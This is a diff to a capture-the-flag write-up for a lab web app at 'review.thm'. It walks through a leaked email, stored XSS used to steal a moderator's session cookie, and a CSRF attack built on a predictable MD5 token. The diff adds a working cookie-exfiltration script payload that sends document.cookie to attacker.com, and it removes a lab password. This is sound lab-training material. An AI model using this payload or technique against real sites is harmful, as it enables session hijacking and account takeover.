@@ -48,7 +48,7 @@ I also ran directory enumeration with Gobuster. One particularly useful discover
 
 ### Finding the Leaked Email
 
-The file `/mail/dump.txt` contained an email describing the internal Finance and Lottery features. It also disclosed the password required to access the Finance feature. The password recorded in public walkthroughs is `S60**f5j`; check it against the value shown in your own active room instance.
+The file `/mail/dump.txt` contained an email describing the internal Finance and Lottery features. It also disclosed the password required to access the Finance feature. 
 
 The important details were:
 
@@ -62,7 +62,7 @@ I saved these details for later because the features were not directly available
 
 ### Website review
 
-The website had a login page and a Contact Us page. I checked the pages and their source, but did not notice an obvious issue at that point. I tried common credentials on the login page, but they did not work, so I continued investigating the contact form.
+The website had a login page and a Contact Us page. I checked the pages and their source codes, but did not notice an obvious issue at that point. I tried common credentials on the login page, but they did not work, so I continued investigating the contact form.
 
 ![Review Shop landing page](screenshots/sequence-2.png)
 
@@ -82,12 +82,11 @@ At this point, I connected two observations:
 This led me to test for **stored cross-site scripting (XSS)** and determine whether JavaScript running in the reviewer's browser could read the session cookie.
 
 I submitted a cookie-exfiltration payload that sent `document.cookie` to my listener. When the submitted message was reviewed, I received the moderator's session cookie. I then replaced my own `PHPSESSID` value with the captured value and refreshed the application.
+used xss payload - `<script>fetch('http://attacker.com/file?cookie='+document.cookie)</script>`
 
 > **Important distinction:** `HttpOnly` being absent does not create XSS by itself. It means JavaScript can read the cookie if script execution is possible in the page. The stored XSS was the mechanism that made the cookie theft possible.
 
 ![Contact form after message submission](screenshots/sequence-5.png)
-
-The callback reached my listener, confirming that the browser had sent the cookie data. I used the captured session value in my browser.
 
 ![Listener received the callback](screenshots/sequence-15.png)
 
@@ -122,7 +121,7 @@ For example, the MD5 hash of `admin` is:
 21232f297a57a5a743894a0e4a801fc3
 ```
 
-I used a hash generator / hash-checking tools on Windows to verify the value. The key issue was that the token was predictable because it was derived from a known username, rather than being a random, session-bound CSRF token.
+I used hashcat tool on Windows to verify the value. The key issue was that the token was predictable because it was derived from a known username, rather than being a random, session-bound CSRF token.
 
 ![Promotion request / application source inspection](screenshots/sequence-12.png)
 
@@ -152,7 +151,7 @@ The idea was to make the administrator's authenticated browser visit the state-c
 </html>
 ```
 
-The same payload is included in [`promote.html`](promote.html). I hosted the page and sent its link through Chat. When the administrator opened the link, their browser followed the redirect to the promotion endpoint while authenticated to `review.thm`.
+I hosted the page and sent its link through Chat. When the administrator opened the link, their browser followed the redirect to the promotion endpoint while authenticated to `review.thm`.
 
 The request promoted `mod` to admin. I then returned to the dashboard and confirmed that the role change had taken effect. This gave me access to the **second flag**.
 
